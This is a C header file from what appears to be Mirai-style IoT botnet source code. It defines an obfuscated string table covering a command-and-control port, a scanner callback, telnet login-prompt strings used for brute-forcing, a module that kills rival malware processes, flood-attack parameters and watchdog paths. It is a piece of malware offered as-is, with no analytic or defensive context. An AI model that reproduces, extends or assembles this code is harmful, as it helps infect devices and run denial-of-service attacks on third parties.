#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_CNC_PORT                  1
#define TABLE_SCAN_CB_PORT              2
#define TABLE_EXEC_SUCCESS              3

#define TABLE_KILLER_PROC               4
#define TABLE_KILLER_EXE                5
#define TABLE_KILLER_FD                 6
#define TABLE_KILLER_MAPS               7
#define TABLE_KILLER_STATUS             8
#define TABLE_KILLER_TCP                9
#define TABLE_KILLER_CMDLINE            10

#define TABLE_KILLER_TMP                11
#define TABLE_KILLER_DATALOCAL          12
#define TABLE_KILLER_QTX                13
#define TABLE_KILLER_DOT                14
#define TABLE_KILLER_ARC                15
#define TABLE_KILLER_ARM                16
#define TABLE_KILLER_ARM5               17
#define TABLE_KILLER_ARM6               18
#define TABLE_KILLER_ARM7               19
#define TABLE_KILLER_X86                20
#define TABLE_KILLER_X86_64             21
#define TABLE_KILLER_SH4                22
#define TABLE_KILLER_MIPS               23
#define TABLE_KILLER_MPSL               24
#define TABLE_KILLER_PPC                25
#define TABLE_KILLER_SDA                26
#define TABLE_KILLER_MTD                27
#define TABLE_KILLER_QTX2               28
#define TABLE_KILLER_HAKAI              29

#define TABLE_SCAN_SHELL                30
#define TABLE_SCAN_ENABLE               31
#define TABLE_SCAN_SYSTEM               32
#define TABLE_SCAN_SH                   33
#define TABLE_SCAN_LSHELL               34
#define TABLE_SCAN_QUERY                35
#define TABLE_SCAN_RESP                 36
#define TABLE_SCAN_NCORRECT             37
#define TABLE_SCAN_OGIN                 38
#define TABLE_SCAN_ASSWORD              39
#define TABLE_SCAN_ENTER                40
#define TABLE_SCAN_BAH                  41
#define TABLE_SCAN_START                42

#define TABLE_ATK_VSE                   43
#define TABLE_ATK_RESOLVER              44
#define TABLE_ATK_NSERV                 45

#define TABLE_MISC_WATCHDOG				46
#define TABLE_MISC_WATCHDOG2			47
#define TABLE_MISC_WATCHDOG3            48
#define TABLE_MISC_WATCHDOG4            49
#define TABLE_MISC_WATCHDOG5            50
#define TABLE_MISC_WATCHDOG6            51
#define TABLE_MISC_WATCHDOG7            52
#define TABLE_MISC_WATCHDOG8            53
#define TABLE_MISC_WATCHDOG9            54

#define TABLE_MISC_RAND					55

#define TABLE_MAX_KEYS  56

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
